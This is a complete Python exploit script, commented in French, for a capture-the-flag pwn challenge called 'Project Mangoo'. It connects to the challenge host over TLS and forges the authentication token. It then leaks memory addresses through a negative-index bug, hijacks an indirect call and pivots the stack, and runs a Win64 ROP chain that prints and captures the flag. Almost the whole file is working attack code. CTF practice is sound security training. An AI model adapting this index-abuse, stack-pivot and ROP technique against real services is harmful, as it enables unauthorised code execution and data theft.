#!/usr/bin/env python3
# Project Mangoo (hiCTF) - pwn Windows/wine - exploit complet
#
# BUG : option 6 "Sync Channel" accepte un index NEGATIF (seule la borne >15 est
#       verifiee). Avec idx=-2 :
#         arena = qword[rsi+0x18]       (buffer que Ingest option 1 remplit)
#         rdx   = qword[arena+0x10]     <- 8 octets controles
#         if rdx != cookie: call rdx    <- appel indirect controle
#       Au moment du call, rcx = rsi+0x18 (PAS le flag) -> il faut pivoter la pile.
#
# PIEGE 1 (buffering) : stdout -> pipe socat, donc bufferise. Il faut fflush(NULL)
#         sinon la sortie de puts ne part jamais (et exit() plante avant le flush).
# PIEGE 2 (pile) : le pivot met rsp = arena+0x18, soit tout en BAS de la region
#         arena (0x4000 o). Des que puts empile, rsp descend sous l'arena -> SEGV.
#         Solution : apres le pivot, 'pop rsp' pour replacer rsp AU MILIEU de
#         l'arena (arena+0x2000), laissant ~0x2000 o de marge pour les push.
#
# Pas d'ASLR (base PE fixe 0x140000000). arena et flag fuites par Query 0 / Query -1.

import ssl, socket, re, struct, sys, time

HOST = "project-mangoo-7e1c71d888de.chall.hiddeninvestigations.net"
PORT = 1337

def rol8(v, n): return ((v << n) | (v >> (8 - n))) & 0xFF
def token_for(ch):  # algo d'auth retro-concu
    return bytes(((rol8(ch[i], 3) ^ ((0x11 * i) & 0xFF) ^ 0x6a) & 0xFF) for i in range(32))
def p64(x): return struct.pack("<Q", x)

class C:
    def __init__(self):
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        s = socket.create_connection((HOST, PORT), timeout=12)
        self.s = ctx.wrap_socket(s, server_hostname=HOST); self.s.settimeout(10); self.buf = b""
    def ru(self, m, tmo=10):
        self.s.settimeout(tmo)
        while m not in self.buf:
            try: c = self.s.recv(4096)
            except Exception: break
            if not c: break
            self.buf += c
        i = self.buf.find(m)
        if i < 0: o = self.buf; self.buf = b""; return o
        o = self.buf[:i + len(m)]; self.buf = self.buf[i + len(m):]; return o
    def sl(self, d): self.s.sendall(d + b"\n")

c = C()
d = c.ru(b"Authorization Token: ")
ch = bytes.fromhex(re.search(rb"Session Challenge: ([0-9a-f]{64})", d).group(1).decode())
c.sl(token_for(ch).hex().encode()); c.ru(b"Option > ")
print("[+] authentifie")

def query(n):
    c.sl(b"2"); c.ru(b"Channel:"); c.sl(str(n).encode()); return c.ru(b"Option > ")

# --- fuites ---
base  = int(re.search(rb"Ref:\s*([0-9a-f]{16})", query(-3)).group(1), 16) - 0x1550
flag  = int(re.search(rb"Ref:\s*([0-9a-f]{16})", query(-1)).group(1), 16)
arena = int(re.search(rb"Ref:\s*([0-9a-f]{16})", query(0)).group(1), 16)
print(f"[+] base image = {base:#x}")
print(f"[+] arena      = {arena:#x}")
print(f"[+] flag @     = {flag:#x}")

# --- gadgets (verifies dans le binaire) ---
PIVOT  = base + 0x16d0   # mov rax,[rcx]; mov rsp,rax; add rsp,0x18; ret
POPRSP = base + 0x169f   # pop rsp; ret
POPRCX = base + 0xbd60   # pop rcx; ret
SKIP28 = base + 0x14e8   # add rsp,0x28; ret   (saute l'espace fantome Win64 de puts)
RET    = base + 0x16da   # ret                 (ajustement d'alignement)
PUTS   = base + 0x18348  # jmp [puts]
FFLUSH = base + 0x183d8  # jmp [fflush]
EXIT   = base + 0x183e0  # jmp [exit]

NEWSP = arena + 0x2000   # nouvelle pile : milieu de l'arena

# --- payload dans l'arena (offsets arena-relatifs) ---
buf = bytearray(0x2080)
def put(off, val): buf[off:off+8] = p64(val)

# 1) cible du call + micro-chaine de repositionnement de pile
put(0x10, PIVOT)     # Sync -2 lit qword[arena+0x10] = cible du call
put(0x18, POPRSP)    # ret du pivot -> pop rsp
put(0x20, NEWSP)     # rsp <- arena+0x2000 (marge pour les push)

# 2) vraie chaine ROP a arena+0x2000
put(0x2000, POPRCX)  # rcx = flag
put(0x2008, flag)
put(0x2010, PUTS)    # puts(flag) ; entree rsp=arena+0x2018 (8 mod 16)
put(0x2018, SKIP28)  # retour puts -> saute l'espace fantome -> arena+0x2048
put(0x2048, POPRCX)  # rcx = 0
put(0x2050, 0)
put(0x2058, RET)     # align avant fflush
put(0x2060, FFLUSH)  # fflush(NULL) ; entree rsp=arena+0x2068 (8 mod 16) -> FLUSH
put(0x2068, EXIT)    # sortie apres flush

# --- Ingest ---
c.sl(b"1"); c.ru(b"Size:"); c.sl(str(len(buf)).encode())
c.ru(b"Stream:"); c.sl(buf.hex().encode()); c.ru(b"Option > ")
print(f"[+] payload ingere ({len(buf)} octets)")

# --- Trigger : Sync ch=-2 ---
c.sl(b"6"); c.ru(b"Channel:"); c.sl(b"-2")
time.sleep(0.6)
out = b""; c.s.settimeout(4)
try:
    while True:
        x = c.s.recv(4096)
        if not x: break
        out += x
except Exception: pass
sys.stdout.write("=== sortie brute ===\n" + out.decode('latin1', 'replace') + "\n")
m = re.search(rb"hiCTF\{[^}]*\}", c.buf + out)
print("\n[+] FLAG =", m.group().decode() if m else "(non trouve)")
